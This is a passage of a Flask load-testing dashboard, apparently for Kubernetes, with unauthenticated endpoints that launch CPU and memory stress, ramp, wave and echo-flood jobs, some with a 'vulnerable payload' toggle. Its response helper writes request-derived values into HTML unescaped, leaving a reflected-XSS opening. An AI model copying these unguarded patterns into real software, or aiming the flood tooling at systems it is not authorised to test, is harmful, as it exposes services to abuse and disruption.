    return render_template_string(
        HTML_TEMPLATE,
        m=m, jobs=jobs, active_jobs=len(jobs),
        cluster=cluster,
        pod_name=POD_NAME, node_name=NODE_NAME,
        echo_url=ECHO_SERVICE_URL,
    )

@app.route('/health')
def health():
    return jsonify({
        'status': 'healthy',
        'version': '3.0.0',
        'pod': POD_NAME,
        'timestamp': datetime.now().isoformat(),
    })

@app.route('/metrics')
def prometheus_metrics():
    inc_metric('requests_total')
    sys_m = collect_system_metrics()
    m = get_metrics_snapshot()
    return jsonify({
        'application': m,
        'system': sys_m,
        'active_jobs': len(get_active_jobs_info()),
    })

@app.route('/status')
def status():
    inc_metric('requests_total')
    m = get_metrics_snapshot()
    return jsonify({
        'pod_name': POD_NAME,
        'node_name': NODE_NAME,
        'active_jobs': len(get_active_jobs_info()),
        'jobs': get_active_jobs_info(),
        'metrics': m,
        'system': {
            'cpu_count': psutil.cpu_count(),
            'memory_total_gb': round(psutil.virtual_memory().total / (1024**3), 2),
        },
        'timestamp': datetime.now().isoformat(),
    })

@app.route('/cluster-status')
def cluster_status_route():
    inc_metric('requests_total')
    return jsonify(get_cluster_stress_status())

# --- Action endpoints (all POST, return JSON, redirect for browser) ---

def _form_or_json():
    if request.is_json:
        return request.get_json()
    return request.form.to_dict()

def _respond(data, status_code=200):
    if request.is_json or request.content_type == 'application/json':
        return jsonify(data), status_code
    # Browser redirect with flash-style message
    msg = data.get('message') or data.get('error') or json.dumps(data)
    return f"""<html><body style="font-family:sans-serif;background:#0f2027;color:#e0e0e0;padding:40px;">
        <div style="max-width:600px;margin:0 auto;background:rgba(255,255,255,0.06);padding:24px;border-radius:12px;">
        <h2>{'Error' if status_code >= 400 else 'OK'}</h2>
        <pre style="white-space:pre-wrap;">{json.dumps(data, indent=2)}</pre>
        <a href="/" style="color:#00d2ff;">Back to Dashboard</a>
        </div>
        <script>setTimeout(()=>window.location.href='/',5000);</script>
        </body></html>""", status_code


@app.route('/api/stress', methods=['POST'])
@app.route('/stress', methods=['GET', 'POST'])
def api_stress():
    inc_metric('requests_total')
    if request.method == 'GET':
        return index()  # show dashboard

    d = _form_or_json()
    jid, err = start_stress(
        cpu_workers=int(d.get('cpu_workers', 2)),
        memory_workers=int(d.get('memory_workers', 1)),
        duration=min(int(d.get('duration', 60)), 3600),
        memory_size=d.get('memory_size', '256M'),
    )
    if err:
        return _respond({'error': err}, 429)
    return _respond({'message': 'Stress test started', 'job_id': jid})


@app.route('/api/ramp', methods=['POST'])
@app.route('/ramp', methods=['POST'])
def api_ramp():
    inc_metric('requests_total')
    d = _form_or_json()
    jid, err = start_ramp(
        max_workers=int(d.get('max_workers', 8)),
        step_duration=int(d.get('step_duration', 20)),
        steps=int(d.get('steps', 5)),
        memory_size=d.get('memory_size', '256M'),
    )
    if err:
        return _respond({'error': err}, 429)
    return _respond({'message': 'Ramp started', 'job_id': jid})


@app.route('/api/wave', methods=['POST'])
@app.route('/wave', methods=['POST'])
def api_wave():
    inc_metric('requests_total')
    d = _form_or_json()
    jid, err = start_wave(
        max_workers=int(d.get('max_workers', 8)),
        period_sec=int(d.get('period_sec', 60)),
        total_duration=min(int(d.get('total_duration', 180)), 3600),
        memory_size=d.get('memory_size', '256M'),
    )
    if err:
        return _respond({'error': err}, 429)
    return _respond({'message': 'Wave started', 'job_id': jid})


@app.route('/api/echo', methods=['POST'])
@app.route('/echo', methods=['POST'])
def api_echo():
    inc_metric('requests_total')
    d = _form_or_json()
    result = call_echo_service(
        message=d.get('message', 'Hello from Load Test v3.0'),
        method=d.get('method', 'POST'),
        vulnerable_payload=d.get('vulnerable_payload') == 'true',
    )
    return _respond(result, 200 if result['success'] else 502)


@app.route('/api/flood', methods=['POST'])
@app.route('/flood', methods=['POST'])
def api_flood():
    inc_metric('requests_total')
    d = _form_or_json()
    jid, err = start_echo_flood(
        rps=min(int(d.get('rps', 5)), 100),
        duration=min(int(d.get('duration', 60)), 3600),
        vulnerable=d.get('vulnerable') == 'true',
    )
    if err:
        return _respond({'error': err}, 429)
    return _respond({'message': 'Echo flood started', 'job_id': jid})


@app.route('/api/stop', methods=['POST'])
@app.route('/stop', methods=['POST'])
def api_stop():
    n = stop_all_jobs()
    return _respond({'message': f'{n} job(s) stopped'})


@app.route('/api/stop/<job_id>', methods=['POST'])
@app.route('/stop/<job_id>', methods=['POST'])
def api_stop_job(job_id):
    ok = stop_job(job_id)
    if ok:
        return _respond({'message': f'Job {job_id} stopped'})
    return _respond({'error': f'Job {job_id} not found'}, 404)


# ============================================================================
# MAIN
# ============================================================================
if __name__ == '__main__':
    # Start background metrics collector
    threading.Thread(target=_metrics_loop, daemon=True).start()

    port = int(os.environ.get('PORT', 8080))
    host = os.environ.get('HOST', '0.0.0.0')

    logger.info(f"Starting Load Testing Application v3.0 on {host}:{port}")
    logger.info(f"Echo Service: {ECHO_SERVICE_URL}")

    if os.environ.get('FLASK_ENV') == 'production':
        try:
            from waitress import serve
            logger.info("Using Waitress production server")
            serve(app, host=host, port=port, threads=8)
        except ImportError:
            logger.warning("Waitress not available, using Flask dev server")
            app.run(host=host, port=port, debug=False, threaded=True)
    else:
        app.run(host=host, port=port, debug=False, threaded=True)
